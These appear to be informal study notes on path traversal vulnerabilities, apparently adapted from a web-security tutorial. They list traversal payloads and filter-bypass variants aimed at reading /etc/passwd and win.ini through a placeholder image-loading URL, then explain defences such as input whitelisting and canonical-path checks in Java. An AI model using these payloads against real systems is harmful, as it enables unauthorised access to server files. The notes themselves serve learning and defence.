if the website calls for stuff on disk you can move around
by changing the link to be like this:

https://insecure-website.com/loadImage?filename=../../../etc/passwd

or on windows it would be:

https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini

if that is blocked, the absolute path can work

/etc/passwd

if that is blocked it could be stripping
path traversal sequences so you need something
like this

....//....//....//etc/passwd

or you might have to use URL encoding of ascii chars
like this

%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd

which means the line below, but written in URL encoding
....//....//....//etc/passwd

other URL encodings include
..%c0%af or ..%ef%bc%8f


 If an application requires that the user-supplied filename must start with the expected base folder, such as /var/www/images, then it might be possible to include the required base folder followed by suitable traversal sequences. For example:
filename=/var/www/images/../../../etc/passwd

 If an application requires that the user-supplied filename must end with an expected file extension, such as .png, then it might be possible to use a null byte to effectively terminate the file path before the required extension. For example:
filename=../../../etc/passwd%00.png

he most effective way to prevent file path traversal vulnerabilities is to avoid passing user-supplied input to filesystem APIs altogether. Many application functions that do this can be rewritten to deliver the same behavior in a safer way.

If it is considered unavoidable to pass user-supplied input to filesystem APIs, then two layers of defense should be used together to prevent attacks:

    The application should validate the user input before processing it. Ideally, the validation should compare against a whitelist of permitted values. If that isn't possible for the required functionality, then the validation should verify that the input contains only permitted content, such as purely alphanumeric characters.
    After validating the supplied input, the application should append the input to the base directory and use a platform filesystem API to canonicalize the path. It should verify that the canonicalized path starts with the expected base directory.

Below is an example of some simple Java code to validate the canonical path of a file based on user input:
File file = new File(BASE_DIRECTORY, userInput);
if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) {
    // process file
}


